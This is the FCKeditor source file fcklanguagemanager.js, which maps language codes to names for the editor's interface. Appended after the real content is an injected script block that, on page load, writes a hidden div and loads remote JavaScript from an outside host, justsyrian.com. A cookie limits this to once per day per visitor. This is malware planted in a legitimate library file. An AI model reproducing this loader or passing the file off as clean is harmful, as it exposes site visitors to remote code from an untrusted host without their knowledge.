/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fcklanguagemanager.js
 * 	This file list all available languages in the editor.
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

var FCKLanguageManager = new Object() ;

FCKLanguageManager.AvailableLanguages = 
{
	'ar'		: 'Arabic',
	'bg'		: 'Bulgarian',
	'bs'		: 'Bosnian',
	'ca'		: 'Catalan',
	'cs'		: 'Czech',
	'da'		: 'Danish',
	'de'		: 'German',
	'el'		: 'Greek',
	'en'		: 'English',
	'en-au'		: 'English (Australia)',
	'en-uk'		: 'English (United Kingdom)',
	'eo'		: 'Esperanto',
	'es'		: 'Spanish',
	'et'		: 'Estonian',
	'eu'		: 'Basque',
	'fa'		: 'Persian',
	'fi'		: 'Finnish',
	'fo'		: 'Faroese',
	'fr'		: 'French',
	'gl'		: 'Galician',
	'he'		: 'Hebrew',
	'hi'		: 'Hindi',
	'hr'		: 'Croatian',
	'hu'		: 'Hungarian',
	'it'		: 'Italian',
	'ja'		: 'Japanese',
	'ko'		: 'Korean',
	'lt'		: 'Lithuanian',
	'lv'		: 'Latvian',
	'mn'		: 'Mongolian',
	'ms'		: 'Malay',
	'nl'		: 'Dutch',
	'no'		: 'Norwegian',
	'pl'		: 'Polish',
	'pt'		: 'Portuguese (Portugal)',
	'pt-br'		: 'Portuguese (Brazil)',
	'ro'		: 'Romanian',
	'ru'		: 'Russian',
	'sk'		: 'Slovak',
	'sl'		: 'Slovenian',
	'sr'		: 'Serbian (Cyrillic)',
	'sr-latn'	: 'Serbian (Latin)',
	'sv'		: 'Swedish',
	'th'		: 'Thai',
	'tr'		: 'Turkish',
	'uk'		: 'Ukrainian',
	'vi'		: 'Vietnamese',
	'zh'		: 'Chinese Traditional',
	'zh-cn'		: 'Chinese Simplified'
}

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
